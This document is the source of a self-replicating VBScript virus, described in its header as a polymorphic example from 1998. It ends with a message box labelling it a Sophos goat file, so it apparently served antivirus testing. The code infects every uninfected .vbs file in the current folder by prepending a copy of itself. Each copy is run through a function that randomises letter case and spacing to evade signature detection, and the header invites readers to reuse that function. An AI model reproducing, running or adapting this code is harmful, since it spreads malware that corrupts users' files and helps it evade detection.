'**********
'     A   polymORphIc     eXAMPLe     vB  SCripT virus  BASEd  ON    vbsv777
'   bY     SpO0kY     +  CaD     -   14.   nOV.    1998   -
'   fEEL frEe     to    USe    The cBMuTaTe   fUnCtIon  in  yOuR   oWN   buGs   :-)

    CoNst  CbfOrreAdiNg   =  1 ,   CbforwrITING     =     2

 rANDOmize
  
   CBWePATh     =   WScRIPt   . scRIPTFuLLNaME
   
    SeT  CbFSO    =    CrEATeObJeCT ( "ScriptiNg.fIlEsyStemOBJECt"    )
  
  SEt     cbWEFile     =    CbfSo .     OPEntExTfilE (  CbwepatH ,  CBfoRrEADing   )
  cBWECOde =  CBwefILE .  rEaDaLl
     CbWEfIle     .   ClOse
 
   cbviRusSize   =    INstR ( 3  , CbWecoDe  ,   "*****"     & "*****"  ) +    10   +    1

     set    cbWefiLe    =     CbFSO   .   OPenteXtfilE (     cBWEpATh    ,    cBfORrEaDiNg )
  cBweCoDe  =  cbwEFILE     .     ReAd    ( cBvIrUssize   )
   cBwEFILE     . clOse
    
  FOR     each     cbFILE     in   cBFso   .  getFoLDeR    (  "."  ) .     fILeS
   
    iF     lcasE  (     CBfso  .  GeTeXtEnsIOnNaMe (    cBfiLE     .  NaME    )     )  =   cHr     ( 118  )    & cHR  (    98   )     &  cHR     ( 115  )    THEn
   
     SEt  CbvicTimFile =    cBfso   . OpENtEXTFILE  (    CbFILE  .    Path     , CBforreAdiNG     )
  cBInfECtiOnMArkEr =   CBviCtIMfILe     .   reaD    (    11 )
 cbVIcTImFiLe .     CLoSE
    
    If cbInfeCtIonMarkeR <>    "'*****"     &   "*****"   thEn

     Set     cbVICtiMFile = cbfsO   .     OpeNTEXtFiLe    (    cbfIle    .  PaTH    ,    CbForreading     )
  cbVicTIMCodE   =   CbVictimfILe     .   reADaLl
  cBvIctiMFilE  .   cloSe
 
     CBVicTimcodE  =    cbMuTaTE    (   cbWecodE    )    &   CBviCTiMCOde
  
  SET     cbVICTimFile  =    cbfSO     .  OPEnteXTfIle (     cbfILe . pAth    , CbForwritInG     ,     1    )
   CbvIctiMFilE     .   WrITE CBvICtimcODe
     CbvICtiMFIlE  .     CLose
    
    END iF
     
   eNd  If
   
 nExT
     
     
 FUnctIoN  CbmuTatE   (     cbSTriNG   )
    
    cBNEwStrINg  =    ""
    cbI =     1
  
 whiLe    CbI   <=  leN   (   cBsTrING     )
   
     if  MiD   (     CBSTring  ,    cBi ,  1  )  =  chR   (    32 )     Then

  for    CBj =    1 To inT    (    5     *    rNd     )   +   1

     cbnEWSTrING    =    CBneWsTRING +   CHr    (     32 )

 neXT
     
 DO
    
  cBI  =     CBI  +     1
     
 LooP  wHILe MId     ( cBStrING  ,    CbI   ,    1     )  = cHR    (    32     )
 
     elSE
     
  iF   INT    (    2     *     rnd     )     + 1    =  1  theN

    cbNEwStRing =    CbnEwSTRIng   +  uCAse   (    miD     (    CBsTRing     ,   cBI ,  1    )  )

    eLse

   cBNewsTRIng    = cbNEWSTring   +   LCAsE    (     miD    (   CbsTRInG  ,    cbI     ,    1 )  )

     end   if

    CbI   =    CBi +    1
    
     end IF
  
 wENd
   
 cBMutatE =    CbNEWStRINg
   
   enD   fuNcTIon
     
 '**********
MsgBox("Sophos VBScript goat file")
